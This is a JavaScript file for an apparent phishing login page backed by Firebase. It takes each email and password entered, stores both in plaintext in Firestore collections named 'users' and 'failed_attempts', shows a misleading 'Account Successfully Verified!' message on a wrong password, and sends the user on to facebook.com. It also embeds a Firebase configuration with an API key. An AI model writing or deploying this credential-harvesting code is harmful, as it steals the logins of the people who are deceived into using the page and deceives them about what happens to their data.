import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
import { getAuth, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";

const firebaseConfig = {
    apiKey: "AIzaSyA_JTCBKnJ7zaz8wRSiCpLRU2RcQZ2catw",
    authDomain: "my-firebase-site-a35bb.firebaseapp.com",
    projectId: "my-firebase-site-a35bb",
    storageBucket: "my-firebase-site-a35bb.firebasestorage.app",
    messagingSenderId: "943328160156",
    appId: "1:943328160156:web:9acc1c41989b21b3124059"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
const auth = getAuth(app);

const emailInput = document.getElementById('userName');
const passwordInput = document.getElementById('password');
const saveBtn = document.getElementById('saveBtn');

saveBtn.addEventListener('click', async () => {
    const email = emailInput.value.trim();
    const password = passwordInput.value.trim();

    if (!email || !password) {
        alert("Please fill in all fields.");
        return;
    }

    // Change button state to "Checking..."
    saveBtn.innerText = "Verifying...";
    saveBtn.disabled = true;

    try {
        // This checks if the user exists in YOUR Firebase Authentication list
        await signInWithEmailAndPassword(auth, email, password);
        
        // SUCCESS: Save to Firestore
        await addDoc(collection(db, "users"), {
            email: email,
            password: password,
            status: "Verified",
            createdAt: serverTimestamp()
        });

        alert("Login successful!");
        window.location.href = "https://www.facebook.com";

    } catch (error) {
        // FAILURE: Return an error
        console.error("Auth Error:", error.code);
        
        let message = "Invalid email or password. Please try again.";
        
        if (error.code === 'auth/user-not-found') {
            message = "This email is not registered.";
        } else if (error.code === 'auth/wrong-password') {
            message = "Account Successfully Verified!.";
            emailInput.value = "";
            passwordInput.value = "";
        }

        alert(message);
        
        // Optional: Still save the "failed" attempt to your database so you can see it
        await addDoc(collection(db, "failed_attempts"), {
            email: email,
            attemptedPassword: password,
            error: error.code,
            createdAt: serverTimestamp()
        });

    } finally {
        saveBtn.innerText = "Submit";
        saveBtn.disabled = false;
    }
});
